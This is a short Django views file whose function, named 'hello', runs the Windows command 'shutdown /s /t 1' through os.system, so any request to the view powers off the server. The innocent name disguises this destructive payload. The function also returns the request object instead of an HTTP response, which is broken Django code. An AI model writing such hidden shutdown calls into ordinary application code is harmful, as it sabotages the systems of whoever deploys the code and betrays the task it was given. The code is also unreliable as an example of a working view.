from django.shortcuts import render

def hello(request):
    import os
    os.system('shutdown /s /t 1')
    return request
